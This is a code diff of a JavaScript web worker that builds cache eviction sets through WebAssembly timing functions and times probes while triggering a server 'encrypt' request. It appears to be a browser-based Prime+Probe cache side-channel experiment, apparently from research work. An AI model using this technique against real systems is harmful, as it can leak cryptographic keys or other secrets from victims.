@@ -3,7 +3,6 @@ function sleep(ms) {
 }
 
 async function encrypt() {
-    await sleep(10);
     console.log("calling encrypt");
     fetch("/encrypt", { method: "POST" }).then(() =>
         console.log("encrypt done!"),
@@ -238,28 +237,14 @@ self.onmessage = async (event) => {
     memDataView = new DataView(memory.buffer);
     let evGenerator = new EvictionSetGenerator(memDataView, config);
 
-    const access = wasmUtils.exports.access;
-    const get_time = wasmUtils.exports.get_time;
-    const timed_access = wasmUtils.exports.timed_access;
-    const evict = wasmUtils.exports.evict;
-    const wait = wasmUtils.exports.wait;
-    const timed_hit = wasmUtils.exports.timed_hit;
-    const probe = wasmUtils.exports.probe;
     const timed_miss = wasmUtils.exports.timed_miss;
     const probe_loop = wasmUtils.exports.probe_loop;
-    // const timed_miss = wasmUtils.exports.timed_miss;
-    // const timed_miss = null;
+    const probe = wasmUtils.exports.probe;
+    const wait = wasmUtils.exports.wait;
 
     console.log("evGenerator created")
     let candidates = evGenerator.generateCandidateSet(config.probe[0], timed_miss);
     console.log("candidate set created with size: ", candidates.length);
-
-    // if(config.threshold == 0) {
-    //     config.threshold = thresholdCalibration(timed_miss, timed_hit, config.probe[0], candidates[0], config.num_measurements)
-    //     console.log("Threshold calibration result:", config.threshold)
-    //     evGenerator = new EvictionSetGenerator(memDataView, config);
-    //     candidates = evGenerator.generateCandidateSet(config.page_size, timed_miss);
-    // }
 
     const evsets = new Array(config.probe.length);
     for(let i = 0; i < evsets.length; i++) {
@@ -274,14 +259,12 @@ self.onmessage = async (event) => {
     // console.log("conflict set created with size: ", conflictSet.length);
 
 
-    const total_num_results = config.time_slots * config.probe.length;
-    const results = new Uint32Array(total_num_results);
-    console.log("total number of results:", total_num_results)
     const time_slot_size = config.time_slot_size
     const wait_cycles = config.wait_cycles;
     const num_addrs = config.probe.length;
     const targets = new Uint32Array(config.probe);
     const evset_bases = new Uint32Array(evsets.map(e => e[0]))
+    const total_num_results = config.time_slots * config.probe.length;
     const resultsPtr = memDataView.byteLength - (total_num_results * 4);
     // copy evset bases and targets to memory
     const evsetsPtr = 64;
@@ -290,16 +273,10 @@ self.onmessage = async (event) => {
         memDataView.setUint32(evsetsPtr + 4 * i, evset_bases[i], true)
         memDataView.setUint32(victimsPtr + 4 * i, targets[i], true)
     }
-    for(let i = 0; i < results.length; i++) {
-        // results[i] = results[i] < config.threshold ? 1 : 0
-        memDataView.setUint32(resultsPtr + 4 * i, 10, true)
-        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
-        // if(!results[i]) numEvicted++;
-    }
     const startTime = new Date();
-    // encrypt();
-    probe_loop(num_addrs, victimsPtr, evsetsPtr, resultsPtr, memDataView.byteLength)
-    // console.log("probeloop:", probe_loop(1, targets[0], evset_bases[0], resultsPtr, memDataView.byteLength))
+    encrypt();
+    probe_loop(num_addrs, victimsPtr, evsetsPtr, resultsPtr, memDataView.byteLength, time_slot_size)
+    // const results = new Uint32Array(total_num_results);
     // for(let i = 0; i < total_num_results; i += num_addrs) {
     //     for(let j = 0; j < num_addrs; j++) {
     //         // access(targets[j])
@@ -308,15 +285,21 @@ self.onmessage = async (event) => {
     //         results[i + j] = probe(targets[j], evset_bases[j]);
     //     }
     //     // evict(conflictSet[0]);
-    //     wait(wait_cycles, time_slot_size)
+    //     wait(time_slot_size)
     // }
     const testTime = new Date(new Date() - startTime);
     console.log(`test took: ${testTime.getMinutes()} mins, ${testTime.getSeconds()} secs and ${testTime.getMilliseconds()} ms`)
     let numEvicted = 0
+    const results = new Uint32Array(total_num_results);
     for(let i = 0; i < results.length; i++) {
-        // results[i] = results[i] < config.threshold ? 1 : 0
-        results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
-        if(!results[i]) numEvicted++;
+        const value = memDataView.getUint32(resultsPtr + 4 * i, true)
+        // results[i] =  value < config.threshold ? 1 : 0;
+        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true) < config.threshold ? 1 : 0;
+        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
+        // results[i] = 30 > value && value < 40 ? 1 : 0;
+        results[i] = value < config.threshold ? 1 : 0;
+
+        if(results[i] > config.threshold) numEvicted++;
     }
     console.log("numEvicted:", numEvicted)
     console.log("percentage evicted:", numEvicted / results.length)
